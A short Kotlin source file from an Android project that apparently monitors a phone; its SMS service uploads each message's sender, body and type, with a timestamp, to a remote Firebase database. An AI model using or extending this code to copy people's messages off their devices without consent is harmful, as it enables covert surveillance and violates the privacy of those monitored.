package com.github.sdt.cypher.services.sms

import android.content.Context
import com.github.sdt.cypher.data.rxFirebase.InterfaceFirebase
import com.github.sdt.cypher.data.model.Sms
import com.github.sdt.cypher.services.base.BaseInteractorService
import com.github.sdt.cypher.utils.ConstFun.getDateTime
import com.github.sdt.cypher.utils.Consts.DATA
import com.github.sdt.cypher.utils.Consts.SMS
import javax.inject.Inject

/**
 * Created by luis rafael on 27/03/18.
 */
class InteractorSms<S : InterfaceServiceSms> @Inject constructor(context: Context, firebase: InterfaceFirebase) : BaseInteractorService<S>(context, firebase), InterfaceInteractorSms<S> {

    override fun setPushSms(smsAddress: String, smsBody: String,type: Int) {
        val sms = Sms(smsAddress, smsBody, getDateTime(),type)
        firebase().getDatabaseReference("$SMS/$DATA").push().setValue(sms).addOnCompleteListener {
            if (isNullService()) getService()!!.stopServiceSms()
        }
    }

}